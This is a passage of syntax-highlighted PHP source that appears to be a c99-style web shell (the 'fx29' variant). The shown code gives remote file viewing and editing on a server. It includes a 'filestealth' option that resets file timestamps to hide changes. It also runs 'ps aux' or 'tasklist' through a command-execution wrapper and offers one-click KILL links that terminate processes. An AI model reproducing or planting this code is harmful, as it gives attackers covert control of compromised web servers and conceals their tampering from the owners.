            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=img&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;imgsize=&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$imgsize</span> <span class="o">!=</span> <span class="nv">$v</span> <span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
            <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;u&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&quot;</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/a&amp;gt; &amp;nbsp; &quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=img&amp;newwin=1&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$width</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$height</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
          <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
          <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
          <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: &quot;</span><span class="o">.</span><span class="nv">$inf</span><span class="p">[</span><span class="s2">&quot;mime&quot;</span><span class="p">]);</span>
          <span class="nb">readfile</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
          <span class="k">exit</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;edit&quot;</span><span class="p">)</span> <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span><span class="nv">$stat</span> <span class="o">=</span> <span class="nb">stat</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);}</span>
         <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Can&#39;t write to file!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
         <span class="k">else</span> <span class="p">{</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Saved!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
           <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$edit_text</span><span class="p">);</span>
           <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
           <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span> <span class="nb">touch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">8</span><span class="p">]);</span> <span class="p">}</span>
           <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$edit_text</span><span class="p">;</span>
         <span class="p">}</span>
       <span class="p">}</span>
       <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">));</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="p">}</span>
       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span> <span class="p">}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_save</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=edit&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
            <span class="s2">&quot;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &quot;</span><span class="o">.</span>
            <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">reset</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Reset</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &quot;</span><span class="o">.</span>
            <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">button</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Back</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
            <span class="s2">&quot;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">edit_text</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
            <span class="s2">&quot;&amp;lt;/form&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ft</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of </span><span class="se">\$</span><span class="s2">GLOBALS.&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Unknown file type (&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="o">.</span><span class="s2">&quot;), please select type manually.&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">###[ DIRECTORY ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;</span><span class="si">$d</span><span class="s2"> is a not a Directory!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Directory information:&amp;lt;/b&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="p">;</span>
        <span class="nv">$ow</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
        <span class="nv">$gr</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
        <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=chmod&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Create time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Access time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;MODIFY time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ PROCESSES ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;processes&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;div class=&quot;barheader&quot;&amp;gt;.: Processes :.&amp;lt;/div&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$handler</span> <span class="o">=</span> <span class="s2">&quot;ps aux&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$grep</span><span class="o">?</span><span class="s2">&quot; | grep &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$grep</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="nv">$handler</span> <span class="o">=</span> <span class="s2">&quot;tasklist&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="nv">$handler</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Can&#39;t execute </span><span class="se">\&quot;</span><span class="si">$handler\</span><span class="s2">&quot;</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="s2">    else {</span>
<span class="s2">      if (empty(</span><span class="si">$processes_sort</span><span class="s2">)) { </span><span class="si">$processes_sort</span><span class="s2"> = </span><span class="si">$sort_default</span><span class="s2">; }</span>
<span class="s2">      </span><span class="si">$parsesort</span><span class="s2"> = parsesort(</span><span class="si">$processes_sort</span><span class="s2">);</span>
<span class="s2">      if (!is_numeric(</span><span class="si">$parsesort[0]</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">      </span><span class="si">$k</span><span class="s2"> = </span><span class="si">$parsesort[0]</span><span class="s2">;</span>
<span class="s2">      if (</span><span class="si">$parsesort[1]</span><span class="s2"> != &quot;</span><span class="nx">a</span><span class="s2">&quot;) {</span>
<span class="s2">        </span><span class="si">$y</span><span class="s2"> = &quot;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_desc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Desc</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_asc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Asc</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sig</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;Sending signal &quot;</span><span class="o">.</span><span class="nv">$sig</span><span class="o">.</span><span class="s2">&quot; to #&quot;</span><span class="o">.</span><span class="nv">$pid</span><span class="o">.</span><span class="s2">&quot;... &quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">posix_kill</span><span class="p">(</span><span class="nv">$pid</span><span class="p">,</span><span class="nv">$sig</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;OK!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;ERROR!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
        <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
        <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
            <span class="nv">$line</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
            <span class="nv">$line</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">get_current_user</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;font class=&quot;on&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
            <span class="nv">$line</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;pid=&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;sig=9</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;KILL&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="c1">#For Windows - Fixed By FaTaLisTiCz_Fx</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;Killing PID &quot;</span><span class="o">.</span><span class="nv">$pid</span><span class="o">.</span><span class="s2">&quot;... &quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;taskkill /PID </span><span class="si">$pid</span><span class="s2"> /F&quot;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
        <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
